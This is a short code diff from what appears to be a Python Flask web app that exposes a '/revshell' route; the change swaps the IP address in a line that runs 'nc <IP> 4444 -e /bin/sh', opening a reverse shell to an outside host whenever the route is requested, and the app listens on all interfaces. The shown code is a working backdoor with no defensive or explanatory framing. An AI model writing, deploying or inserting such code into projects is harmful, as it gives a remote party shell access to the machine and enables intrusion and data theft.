@@ -17,7 +17,7 @@ def cmd():
 
 @app.get("/revshell")
 def revshell():
-    os.system('nc 138.124.101.70 4444 -e /bin/sh')
+    os.system('nc 147.45.152.20 4444 -e /bin/sh')
     return 'runned'
 
 app.run(host='0.0.0.0')
